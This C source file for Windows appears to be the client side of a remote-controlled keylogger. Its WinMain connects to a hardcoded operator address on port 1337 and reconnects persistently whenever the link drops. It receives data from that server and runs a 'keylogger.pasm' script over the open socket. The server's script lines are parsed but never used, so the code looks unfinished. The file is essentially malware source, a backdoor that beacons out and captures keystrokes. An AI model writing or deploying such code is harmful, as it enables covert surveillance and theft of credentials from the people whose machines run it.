#include "../include/pasm.h"
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>
#include <winsock.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 4096

char** get_lines(char* str, int* count) {
    // Check for null pointer
    if (!str || !count) {
        return 0;
    }

    // Count the number of lines
    *count = 1;
    for (char* p = str; *p; ++p) {
        if (*p == '\r' && *(p + 1) == '\n') {
            ++(*count);
            ++p; // Skip '\n'
        }
    }

    // Allocate memory for char** array
    char** lines = (char**)malloc((*count + 1) * sizeof(char*));
    if (!lines) {
        // Handle allocation failure
        return 0;
    }

    // Copy lines to char** array
    int lineIndex = 0;
    char* start = str;
    for (char* p = str; *p; ++p) {
        if (*p == '\r' && *(p + 1) == '\n') {
            int lineLength = p - start;
            lines[lineIndex] = (char*)malloc((lineLength + 1) * sizeof(char));
            if (!lines[lineIndex]) {
                // Handle allocation failure
                // Free previously allocated memory
                for (int i = 0; i < lineIndex; ++i) {
                    free(lines[i]);
                }
                free(lines);
                return 0;
            }
            strncpy(lines[lineIndex], start, lineLength);
            lines[lineIndex][lineLength] = '\0'; // Null-terminate the line
            ++lineIndex;
            ++p; // Skip '\n'
            start = p + 1; // Move to the next line
        }
    }

    // Copy the last line
    int lastLineLength = strlen(start);
    lines[lineIndex] = (char*)malloc((lastLineLength + 1) * sizeof(char));
    if (!lines[lineIndex]) {
        // Handle allocation failure
        // Free previously allocated memory
        for (int i = 0; i <= lineIndex; ++i) {
            free(lines[i]);
        }
        free(lines);
        return 0;
    }
    strcpy(lines[lineIndex], start);
    lines[*count] = 0; // Null-terminate the char** array

    return lines;
}

int WinMain(
  HINSTANCE hInstance,
  HINSTANCE hPrevInstance,
  LPSTR     lpCmdLine,
  int       nShowCmd
) {
    int sock;
    int first = 1;
    struct sockaddr_in server;
    char* server_reply = (char*)malloc(BUFFER_SIZE);
    if (server_reply == NULL) {
        return -1;
    }

    server.sin_family = AF_INET;
    WORD wVersionRequested = MAKEWORD(2, 2);
    WSADATA wsaData;
    WSAStartup(wVersionRequested, &wsaData);

retry:
    if (!first) {
        closesocket(sock);
    }
    else {
        first = 0;
    }

    server.sin_addr.s_addr = inet_addr("192.168.1.35");
    server.sin_port = htons(1337);

    //Create socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == -1) {
        Sleep(500);
        goto retry;
    }

    //Connect to remote server
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0)
    {
        //connect failed
        Sleep(500);
        goto retry;
    }

    //keep communicating with server
    while (1)
    {
        memset(server_reply, 0, BUFFER_SIZE);

        //Receive a reply from the server
        if (recv(sock, server_reply, BUFFER_SIZE, 0) <= 0)
        {
            //recv failed
            Sleep(500);
            goto retry;
        }

		int lines = 0;
		char **script = get_lines(server_reply, &lines);

        printf("%d\n", pasm_run_script("../examples/keylogger.pasm", 0, 0, sock));
    }
    return 0;
}
